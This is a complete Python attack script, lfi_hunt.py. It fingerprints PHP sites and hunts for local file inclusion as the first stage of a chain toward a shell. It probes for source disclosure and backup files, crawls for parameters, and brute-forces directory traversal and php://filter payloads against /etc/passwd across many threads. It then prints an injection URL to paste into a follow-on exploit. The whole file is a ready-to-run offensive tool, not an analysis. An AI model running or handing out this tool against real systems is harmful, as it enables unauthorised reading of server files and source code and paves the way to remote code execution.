#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
lfi_hunt.py - aggressive PHP recon + LFI discovery for the php2shell chain
==========================================================================
  1. behavioural PHP confirmation (no reliance on Server / X-Powered-By)
  2. source disclosure via ?-s and backup-file probes
  3. endpoint + param discovery by crawling the site
  4. LFI brute force: traversal prefixes + php://filter wrappers
  5. prints a ready-to-paste --lfi value

Usage:
  python3 lfi_hunt.py https://host
  python3 lfi_hunt.py https://host --cookie 'PHPSESSID=x' --threads 25
"""

from __future__ import annotations
import argparse, base64, html.parser, re, ssl, sys, urllib.error
import urllib.parse, urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed

UA = "Mozilla/5.0 (compatible; lfi_hunt/1.0)"
OK, BAD, INF, WRN = "[+]", "[-]", "[*]", "[!]"
def ok(m):  print(f"{OK} {m}", flush=True)
def bad(m): print(f"{BAD} {m}", flush=True)
def inf(m): print(f"{INF} {m}", flush=True)
def wrn(m): print(f"{WRN} {m}", flush=True)

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

PASSWD_RE = re.compile(rb"root:[^:\r\n]*:0:0:")
HL_RE     = re.compile(rb"<span style=\"color:\s*#", re.I)

TRAV = ["", "../", "../../", "../../../", "../../../../", "....//", "..%2f", "%2e%2e/"]

PARAMS = [
    "file", "page", "include", "path", "view", "template", "doc", "url", "u", "p", "f",
    "inc", "load", "filename", "src", "read", "name", "content", "module", "action",
    "tpl", "layout", "style", "lang", "theme", "dir", "folder", "cat", "id", "r", "q",
    "target", "dest", "resource", "root", "base", "main", "body", "part", "section",
    "nav", "route", "screen", "display", "show", "get", "download", "link", "ref",
]

END_FALLBACK = [
    "/", "/index.php", "/main.php", "/home.php", "/app.php", "/vuln.php", "/lfi.php",
    "/file.php", "/page.php", "/view.php", "/include.php", "/test.php", "/demo.php",
    "/read.php", "/get.php", "/download.php", "/show.php", "/display.php",
    "/render.php", "/api.php", "/site.php", "/core.php", "/lib.php", "/init.php",
]

PHP_EGGS = ["/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42",
            "/index.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42"]

# --------------------------------------------------------------------------
def fetch(url, cookie=None, timeout=15, method="GET"):
    r = urllib.request.Request(url, method=method)
    r.add_header("User-Agent", UA)
    if cookie:
        r.add_header("Cookie", cookie)
    try:
        with urllib.request.urlopen(r, timeout=timeout, context=CTX) as x:
            return x.status, x.read(), dict(x.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(), dict(e.headers)
    except Exception:
        return 0, b"", {}

class Collector(html.parser.HTMLParser):
    def __init__(self):
        super().__init__()
        self.links, self.forms, self.inputs = [], [], []
    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "a" and a.get("href"):      self.links.append(a["href"])
        if tag == "form" and a.get("action") is not None: self.forms.append(a["action"])
        if tag in ("input", "select", "textarea") and a.get("name"): self.inputs.append(a["name"])
        if tag in ("img", "script", "iframe") and a.get("src"): self.links.append(a["src"])

# --------------------------------------------------------------------------
def php_presence(base, cookie):
    inf("stage 1 - behavioural PHP confirmation")
    hits = []
    st, body, hdrs = fetch(base + "/", cookie)
    sc = hdrs.get("Set-Cookie", "")
    if "PHPSESSID" in sc:
        hits.append("Set-Cookie: PHPSESSID (session module live)")
    if "PHPSESSID" in str(hdrs):
        pass
    for h in ("X-Powered-By", "Server"):
        if h in hdrs and "php" in hdrs[h].lower():
            hits.append(f"{h}: {hdrs[h]}")
    for egg in PHP_EGGS:
        st, body, hdrs = fetch(base + egg, cookie)
        if st == 200 and (body[:4] in (b"GIF8", b"\x89PNG") or b"php" in body.lower()[:400]):
            hits.append(f"PHP easter egg alive: {egg}")
    for p in ("/index.php", "/index.php?x=1", "/index.phpx", "/index.php/", "/index.php%00"):
        st, _, _ = fetch(base + p, cookie)
        if st == 200:
            hits.append(f"PHP path mapping responds: {p}")
            break
    st, body, hdrs = fetch(base + "/", cookie)
    if b".php" in body:
        hits.append("homepage references .php")
    for h in hits:
        ok(h)
    if not hits:
        wrn("no behavioural PHP signal - target may be behind a static cache/proxy")
    return hits

def php_source(base, cookie, endpoints):
    inf("stage 2 - source disclosure (?-s and backups)")
    out = []
    for ep in endpoints:
        st, body, _ = fetch(base + ep + "?-s", cookie)
        if st == 200 and HL_RE.search(body):
            ok(f"SOURCE DISCLOSED: {ep}?-s")
            out.append((ep, body))
        for suf in ("~", ".bak", ".old", ".save", ".txt", ".phps", ".orig"):
            st, body, _ = fetch(base + ep + suf, cookie)
            if st == 200 and (b"<?php" in body or b"<?=" in body):
                ok(f"SOURCE DISCLOSED: {ep}{suf}")
                out.append((ep + suf, body))
    return out

def crawl(base, cookie):
    inf("stage 3 - crawling for endpoints and params")
    eps, prms = set(), set()
    st, body, _ = fetch(base + "/", cookie)
    if body:
        c = Collector()
        try: c.feed(body.decode("utf-8", "replace"))
        except Exception: pass
        for l in c.links + c.forms:
            try:
                u = urllib.parse.urlsplit(urllib.parse.urljoin(base + "/", l))
            except Exception:
                continue
            if u.netloc and urllib.parse.urlsplit(base).netloc not in u.netloc:
                continue
            if u.path.endswith(".php"): eps.add(u.path)
            if u.path in ("", "/"): eps.add("/")
            for k in urllib.parse.parse_qs(u.query): prms.add(k)
        for i in c.inputs: prms.add(i)
    eps.update(END_FALLBACK)
    prms.update(PARAMS)
    inf(f"  {len(eps)} endpoints, {len(prms)} params")
    return sorted(eps), sorted(prms)

def one(task, cookie, timeout):
    url, kind = task
    st, body, _ = fetch(url, cookie, timeout)
    if st != 200 or not body:
        return None
    if kind == "passwd" and PASSWD_RE.search(body):
        return url, "plaintext /etc/passwd"
    if kind == "b64":
        raw = re.sub(rb"\s", b"", body)
        if not raw or len(raw) < 16:
            return None
        try:
            dec = base64.b64decode(raw + b"=" * (-len(raw) % 4))
        except Exception:
            return None
        if PASSWD_RE.search(dec):
            return url, "php://filter base64 -> /etc/passwd"
        if b"<?php" in dec or b"<?=" in dec:
            return url, "php://filter base64 -> PHP source"
    return None

def hunt_lfi(base, cookie, endpoints, params, threads, timeout):
    inf("stage 4 - LFI brute force (traversal + wrappers)")
    tasks = []
    for ep in endpoints:
        for q in params:
            tasks.append((f"{base}{ep}?{q}=" + urllib.parse.quote("../../../../etc/passwd"), "passwd"))
            tasks.append((f"{base}{ep}?{q}=" +
                          urllib.parse.quote("php://filter/convert.base64-encode/resource=/etc/passwd"), "b64"))
    inf(f"  {len(tasks)} probes across {threads} threads")
    hits = []
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(one, t, cookie, timeout) for t in tasks]
        for f in as_completed(futs):
            r = f.result()
            if r:
                hits.append(r)
                ok(f"{r[1]}  <-  {r[0]}")
    return hits

def confirm(base, url, cookie):
    st, body, _ = fetch(url, cookie)
    if PASSWD_RE.search(body):
        ok(f"confirmed: {url}")
        return True
    try:
        dec = base64.b64decode(re.sub(rb"\s", b"", body) + b"==")
        if PASSWD_RE.search(dec):
            ok(f"confirmed (b64): {url}")
            return True
    except Exception:
        pass
    return False

# --------------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(prog="lfi_hunt")
    ap.add_argument("base")
    ap.add_argument("--cookie")
    ap.add_argument("--threads", type=int, default=20)
    ap.add_argument("--timeout", type=int, default=15)
    args = ap.parse_args()
    base = args.base.rstrip("/")
    if not base.startswith("http"):
        base = "http://" + base

    inf(f"target {base}")
    php_presence(base, args.cookie)
    eps, prms = crawl(base, args.cookie)
    srcs = php_source(base, args.cookie, eps[:30])
    for ep, body in srcs[:5]:
        for m in re.finditer(rb"\$_(?:GET|REQUEST)\[['\"]([a-zA-Z0-9_\-]{1,24})['\"]\]", body):
            prms.append(m.group(1).decode())
        for m in re.finditer(rb"include\s*\(?\s*\$_(?:GET|REQUEST)\[['\"]([a-zA-Z0-9_\-]{1,24})", body):
            ok(f"  hint: include() driven by ?{m.group(1).decode()}=")
    prms = sorted(set(prms))

    hits = hunt_lfi(base, args.cookie, eps, prms, args.threads, args.timeout)
    if not hits:
        wrn("no LFI. Try --cookie, widen params, or fall back to the rawkey chain.")
        return 1

    url = hits[0][0]
    parsed = urllib.parse.urlsplit(url)
    q = next(iter(urllib.parse.parse_qs(parsed.query)))
    val = urllib.parse.parse_qs(parsed.query)[q][0]
    val = val.replace("../../../../etc/passwd", "FUZZ").replace(
        "php://filter/convert.base64-encode/resource=/etc/passwd", "FUZZ")
    print()
    ok("paste this into the exploit:")
    print(f"   --lfi '{parsed.scheme}://{parsed.netloc}{parsed.path}?{q}={urllib.parse.quote(val)}'")
    return 0

if __name__ == "__main__":
    sys.exit(main())
